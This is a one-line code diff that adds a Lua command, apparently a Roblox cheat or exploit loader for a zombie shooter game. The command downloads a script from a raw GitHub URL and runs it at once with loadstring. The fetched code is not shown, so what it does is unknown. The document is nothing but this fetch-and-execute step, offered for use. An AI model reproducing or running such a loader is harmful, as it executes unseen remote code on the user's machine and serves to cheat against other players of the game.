@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pitroninrank/loaders/main/loaders/zombies-hypershot-spam3-0en31upbmfu1gm.lua"))()
